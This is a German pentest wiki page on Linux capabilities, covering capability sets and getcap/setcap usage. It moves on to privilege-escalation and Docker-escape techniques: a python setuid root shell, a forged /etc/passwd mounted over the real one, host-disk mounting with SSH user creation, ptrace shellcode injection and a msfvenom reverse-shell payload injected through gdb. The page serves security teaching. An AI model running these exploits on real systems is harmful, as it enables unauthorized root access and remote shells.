# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux-Capabilities teilen **Root-Rechte in kleinere, eigenständige Einheiten** auf, sodass Prozesse eine Teilmenge dieser Rechte erhalten können. Dadurch werden Risiken minimiert, da nicht unnötigerweise vollständige Root-Rechte vergeben werden.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Das Problem:

- Normale Benutzer haben nur eingeschränkte Berechtigungen für Vorgänge wie das Öffnen von Raw-Sockets oder das Binden an Internet-Ports unter 1024. Capabilities können gezielt die erforderliche Berechtigung gewähren, statt vollständige Root-Rechte zu vergeben.<sup>[[14]](#references)</sup>

### Capability-Sets:

Linux stellt diese Capability-Sets pro Thread bereit. Der Kernel wendet ihre Einschränkungen an, wenn ein Prozess seine Anmeldedaten ändert oder eine Datei ausführt.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

   - **Zweck**: Gibt an, welche Capabilities nach `execve()` zum Permitted-Set beitragen können, wenn die ausgeführte Datei über entsprechende vererbbare File-Capabilities verfügt.
   - **Funktionsweise**: Das vererbbare Set des Threads bleibt über `execve()` hinweg erhalten; dadurch werden diese Capabilities nicht automatisch wirksam.
   - **Einschränkungen**: Das Hinzufügen einer Capability zu diesem Set ist durch die Permitted- und Bounding-Sets eingeschränkt.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

   - **Zweck**: Stellt die Capabilities dar, die ein Prozess gerade tatsächlich verwendet.
   - **Funktionsweise**: Der Kernel prüft dieses Set, um Berechtigungen für verschiedene Vorgänge zu gewähren. Bei Dateien kann dieses Set ein Flag sein, das angibt, ob die erlaubten Capabilities der Datei als wirksam gelten sollen.
   - **Bedeutung**: Das Effective-Set ist für unmittelbare Berechtigungsprüfungen entscheidend und dient als aktives Set der Capabilities, die ein Prozess nutzen kann.

3. **Permitted (CapPrm)**:

   - **Zweck**: Legt die maximale Menge an Capabilities fest, über die ein Prozess verfügen kann.
   - **Funktionsweise**: Ein Prozess kann eine Capability aus dem Permitted-Set in sein Effective-Set übernehmen und sie dadurch nutzen. Er kann Capabilities auch aus seinem Permitted-Set entfernen.
   - **Grenze**: Wird eine Capability aus diesem Set entfernt, kann sie normalerweise nicht wiederhergestellt werden, ohne eine Datei auszuführen, die sie gewährt, oder einen anderen privilegierten Übergang auszulösen.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **Zweck**: Begrenzt die Capabilities, die ein Prozess durch eine Datei bei `execve()` erlangen oder seinem vererbbaren Set hinzufügen kann.
   - **Funktionsweise**: Das Set wird über `fork()` hinweg vererbt und bleibt über `execve()` hinweg erhalten; Capabilities können daraus entfernt werden, wenn der aufrufende Prozess über `CAP_SETPCAP` verfügt.
   - **Anwendungsfall**: Werden unnötige Capabilities aus diesem Set entfernt, ist die spätere Erlangung zusätzlicher Rechte eingeschränkt.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **Zweck**: Ermöglicht es ausgewählten Capabilities, bei `execve()` eines nicht privilegierten Programms weiterhin erlaubt und wirksam zu bleiben.
   - **Funktionsweise**: Ambient-Capabilities werden den neuen Permitted- und Effective-Sets hinzugefügt, wenn die ausgeführte Datei nicht privilegiert ist.
   - **Einschränkungen**: Eine Capability kann nur dann ambient sein, wenn sie sowohl im Permitted- als auch im Inheritable-Set vorhanden ist; beim Ausführen einer Datei mit set-user-ID/set-group-ID oder einer Datei mit Capabilities wird das Ambient-Set geleert.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities von Prozessen und Binärdateien

### Capabilities von Prozessen

Um die Capabilities eines bestimmten Prozesses anzuzeigen, verwende die Datei **status** im Verzeichnis /proc. Da sie mehr Details enthält, beschränken wir uns auf die Informationen zu Linux-Capabilities.\
Beachte, dass Capability-Informationen für alle laufenden Prozesse pro Thread verwaltet werden, während File-Capabilities in erweiterten Attributen vom Typ `security.capability` gespeichert werden.<sup>[[14]](#references)[[15]](#references)</sup>

Die definierten Capabilities findest du in /usr/include/linux/capability.h

Die Capabilities des aktuellen Prozesses findest du mit `cat /proc/self/status` oder `capsh --print`; die anderer Prozesse stehen in `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Dieser Befehl sollte auf den meisten Systemen fünf Capability-Zeilen ausgeben.<sup>[[15]](#references)</sup>

- CapInh = Geerbte Capabilities
- CapPrm = Erlaubte Capabilities
- CapEff = Effektive Capabilities
- CapBnd = Begrenzende Menge
- CapAmb = Menge der Ambient Capabilities

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Diese hexadezimalen Zahlen ergeben keinen Sinn. Mit dem Dienstprogramm `capsh` können wir sie in Capability-Namen umwandeln.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Sehen wir uns jetzt die von `ping` verwendeten **Capabilities** an:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Obwohl das funktioniert, gibt es einen anderen und einfacheren Weg. Um die Capabilities eines laufenden Prozesses anzuzeigen, verwenden Sie das Tool **getpcaps**, gefolgt von seiner Prozess-ID (PID); es akzeptiert auch eine Liste von Prozess-IDs.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Überprüfen wir die Capabilities von `tcpdump`, nachdem wir der Binärdatei `cap_net_admin` und `cap_net_raw` hinzugefügt haben, um den Netzwerkverkehr mitzuschneiden (`tcpdump` läuft im Prozess 9562).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Wie du sehen kannst, stimmen die Capabilities mit den Ergebnissen der beiden Methoden zur Untersuchung eines Prozesses überein. Das Tool `getpcaps` verwendet libcap, um die Capabilities eines Zielprozesses abzufragen und sie in Textform auszugeben; es akzeptiert eine oder mehrere PIDs.<sup>[[22]](#references)</sup>

### Capabilities von Binärdateien

Binärdateien können über File Capabilities verfügen, die während der Ausführung angewendet werden. Beispielsweise kann eine `ping`-Binärdatei die Capability `cap_net_raw` besitzen.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Mit `getcap -r` kannst du **Binärdateien mit Capabilities durchsuchen**.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Capabilities mit capsh entfernen

Wenn wir `CAP_NET_RAW` aus dem maßgeblichen Bounding Set entfernen, sollte ein Programm, das diese Capability benötigt, sie nicht mehr verwenden können.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Neben der Ausgabe von _capsh_ selbst sollte auch der Befehl _tcpdump_ einen Fehler ausgeben.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Der Fehler zeigt, dass `tcpdump` nicht mit der angeforderten Datei-Capability ausgeführt werden kann, nachdem `CAP_NET_RAW` aus der Bounding Set entfernt wurde.

### Capabilities entfernen

Du kannst die Capabilities einer Datei mit `setcap -r` entfernen.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Benutzer-Capabilities

Linux weist Login-Benutzern keine Date capabilities direkt zu, aber das PAM-Modul `pam_cap` kann für authentifizierte Sitzungen mithilfe von `/etc/security/capability.conf` vererbbare Capabilities festlegen.<sup>[[16]](#references)</sup> Jeder Eintrag ordnet durch Kommas getrennte Capability-Namen oder -Nummern einem oder mehreren Benutzernamen zu.<sup>[[17]](#references)</sup>
Dateibeispiel:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Umgebungs-Capabilities

Durch das Kompilieren des folgenden Programms lässt sich **eine bash-Shell innerhalb einer Umgebung starten, die Capabilities bereitstellt**.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Innerhalb der **bash, die von der kompilierten Ambient-Binärdatei ausgeführt wird**, lassen sich die **neuen Capabilities** beobachten (ein normaler Benutzer hat im Abschnitt „current“ keine Capability).<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> Sie können **nur Capabilities hinzufügen, die sowohl in der erlaubten als auch in der vererbbaren Menge vorhanden sind**.<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb-Binärdateien

Eine Capability-dumb-Binärdatei ist ein Programm mit Datei-Capabilities, das diese nicht mit libcap verwaltet. Wenn das Effective-Bit der Datei gesetzt ist, aktiviert der Kernel die erlaubten Capabilities der Datei in der effektiven Menge des Prozesses; die Ausführung kann fehlschlagen, wenn der Prozess nicht alle erlaubten Capabilities erhalten hat.<sup>[[14]](#references)</sup>

## Service-Capabilities

Ein Systemdienst, der als root ausgeführt wird, kann weitreichende Capabilities behalten, sofern seine Ausführungsumgebung diese nicht einschränkt. In einer systemd-Unit wählt `User=` den Benutzer des Dienstes aus, und `AmbientCapabilities=` fügt der Ambient-Menge des ausgeführten Prozesses benannte Capabilities hinzu.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Capabilities in Docker-Containern

Docker startet Container mit einem standardmäßigen Capability-Satz, der mit `--cap-add` und `--cap-drop` geändert werden kann; ein Beispielcontainer lässt sich mit `amicontained` untersuchen.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities sind nützlich, wenn Sie **Ihre eigenen Prozesse nach privilegierten Operationen einschränken möchten** (z. B. nach dem Einrichten von chroot und dem Binden an einen Socket). Sie können jedoch ausgenutzt werden, indem ihnen bösartige Befehle oder Argumente übergeben werden, die dann als root ausgeführt werden.<sup>[[2]](#references)</sup>

Mit `setcap` können Sie Dateifähigkeiten für Programme festlegen und mit `getcap` abfragen.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

Im File-Capability-Text hebt `+ep` die angegebene Capability in den effektiven und erlaubten Sets an; `-` senkt die ausgewählten Flags ab.<sup>[[21]](#references)</sup>

Um Programme mit Capabilities auf einem System oder in einem Ordner zu finden, verwende `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Ausnutzungsbeispiel

Im folgenden Beispiel wird festgestellt, dass die Binärdatei `/usr/bin/python2.6` anfällig für privesc ist:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities**, die `tcpdump` benötigt, damit beliebige Benutzer Pakete sniffen können:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Der Sonderfall eines ausgelassenen Capability-Namens

Im Textformat von libcap bedeutet `getcap myelf` mit der Ausgabe `myelf =ep`, dass **alle Capabilities** als effektiv und erlaubt markiert sind, vorbehaltlich der Bounding Set des ausführenden Prozesses, des User Namespace und anderer Ausführungsbeschränkungen. Die leere File-Capability-Menge lautet `myelf =` (ohne `e` oder `p`); sie unterscheidet sich von einer Datei ohne Capability-Attribut. Eine Datei mit `=ep` setzt die Prozess-UID nicht automatisch auf root, aber ein Programm, das `CAP_DAC_READ_SEARCH` oder `CAP_DAC_OVERRIDE` verwenden kann, kann Dateien lesen, auf die es mit seiner Unix-UID sonst keinen Zugriff hätte. Prüfe den tatsächlichen Dateimodus der ausführbaren Datei, den Namespace und die effektiven Capabilities, bevor du ihre Eingabeoptionen als privilegierten Pfad zum Lesen von Dateien einstufst. Siehe libcaps [Capability-Textformat](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) und [Verhalten bei leerem Wert](https://man7.org/linux/man-pages/man8/getcap.8.html).<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ist eine äußerst mächtige Linux-Capability, die aufgrund ihrer umfangreichen **administrativen Berechtigungen** – etwa dem Einhängen von Geräten oder der Manipulation von Kernel-Funktionen – oft mit einem nahezu mit root vergleichbaren Berechtigungsniveau gleichgesetzt wird. Obwohl sie für Container, die ganze Systeme simulieren, unverzichtbar ist, **birgt `CAP_SYS_ADMIN` erhebliche Sicherheitsrisiken**, insbesondere in containerisierten Umgebungen, da sie Privilegieneskalation und die Kompromittierung des Systems ermöglichen kann. Ihre Verwendung erfordert daher strenge Sicherheitsprüfungen und eine sorgfältige Verwaltung. Um dem **Prinzip der geringsten Privilegien** zu entsprechen und die Angriffsfläche zu minimieren, sollte diese Capability in anwendungsspezifischen Containern vorzugsweise entfernt werden.<sup>[[14]](#references)</sup>

Bei Namespace-Wechseln kommt es auf den Geltungsbereich an: `setns()` prüft `CAP_SYS_ADMIN` im User Namespace, dem der Ziel-Namespace gehört. Der Wechsel in einen Mount-Namespace erfordert außerdem `CAP_SYS_CHROOT` im User Namespace des aufrufenden Prozesses. Eine Capability, die nur innerhalb eines privaten, neu zugeordneten User Namespace gehalten wird, gewährt daher keinen beliebigen Zugriff auf die initialen Host-Namespaces.<sup>[[14]](#references)</sup>

**Beispiel mit einer Binärdatei**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Mit Python kannst du eine manipulierte _passwd_-Datei über die echte _passwd_-Datei mounten:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

Und schließlich die modifizierte `passwd`-Datei über `/etc/passwd` mounten:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

Und du kannst dich mit dem Passwort „password“ als root **`su`**.

**Beispiel mit Environment (Docker breakout)**

Du kannst die aktivierten Capabilities im Docker-Container mit folgendem Befehl überprüfen:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

In der vorherigen Ausgabe ist zu sehen, dass die SYS_ADMIN-Capability aktiviert ist.<sup>[[14]](#references)</sup>

- **Mount**

Mit geeignetem Zugriff auf Geräte und Namespaces kann ein Docker-Container dadurch **eine Host-Festplatte mounten und auf deren Inhalte zugreifen**. Der Geräteknoten muss ein echtes Host-Gerät darstellen, die Device-Cgroup muss den Zugriff erlauben, und zum Mounten eines blockbasierten Dateisystems ist `CAP_SYS_ADMIN` im initialen User-Namespace erforderlich.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Vollständiger Zugriff**

Mit der vorherigen Methode konnten wir auf eine Host-Festplatte zugreifen.\
Wenn auf dem Host ein **ssh**-Server läuft, könntest du **einen Benutzer auf der eingehängten Festplatte erstellen** und über SSH darauf zugreifen.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

Direkte Lese- und Schreibzugriffe unter `/mnt/host` bedeuten bereits Zugriff auf das Host-Dateisystem. Das abschließende `chroot` ist lediglich eine Erleichterung für die Pfadnavigation und erfordert zusätzlich `CAP_SYS_CHROOT`; es ist nicht der Schritt, der den Ausbruch ermöglicht.

## CAP_SYS_PTRACE

Mit `CAP_SYS_PTRACE` kann ein Prozess andere Prozesse verfolgen und untersuchen, die in seinem PID-Namespace sichtbar sind. Um aus einem Docker-Container auf Host-Prozesse zuzugreifen, teile den PID-Namespace des Hosts mit `--pid=host` (oder tritt einem Namespace bei, der das Ziel enthält).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** gewährt die Möglichkeit, Debugging- und Systemaufruf-Trace-Funktionen zu nutzen, die von `ptrace(2)` und Cross-Memory-Attach-Aufrufen wie `process_vm_readv(2)` und `process_vm_writev(2)` bereitgestellt werden. Obwohl diese Funktionen für Diagnose- und Überwachungszwecke leistungsstark sind, können sie die Systemsicherheit erheblich beeinträchtigen, wenn `CAP_SYS_PTRACE` ohne restriktive Maßnahmen wie einen seccomp-Filter für `ptrace(2)` aktiviert ist. Konkret kann es dazu verwendet werden, andere Sicherheitseinschränkungen zu umgehen, insbesondere solche, die durch seccomp auferlegt werden, wie [Proofs of Concept (PoC) wie dieser](https://gist.github.com/thejh/8346f47e359adecd1d53) zeigen.<sup>[[10]](#references)</sup>

**Beispiel mit Binary (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Beispiel mit einer Binärdatei (gdb)**

`gdb` mit `ptrace`-Capability:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Eine Capability eines Debuggers ist lediglich ein Hinweis für die weitere Prüfung. Prüfe, ob der aktuelle Prozess genau diese Datei ausführen kann (einschließlich Gruppen- und ACL-Berechtigungen), ob `CAP_SYS_PTRACE` nach der Ausführung effektiv ist und ob ein Zielprozess mit höheren Privilegien im selben PID-Namespace sichtbar ist und an ihn angehängt werden kann. `no_new_privs`, ein `nosuid`-Mount, die Capability-Bounding-Set, Yama, seccomp oder ein LSM können das Ergebnis beeinflussen. Siehe [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) und die [Yama-Dokumentation des Kernels](https://docs.kernel.org/admin-guide/LSM/Yama.html). Ermittle Datei- und Prozessmetadaten, ohne dich an einen Zielprozess anzuhängen.

Erstelle einen Shellcode mit msfvenom, um ihn via gdb in memory zu injecten.

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Debugge einen Root-Prozess mit gdb und füge die zuvor generierten gdb-Zeilen per Copy-paste ein:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Beispiel mit Umgebung (Docker breakout) – Another gdb Abuse**

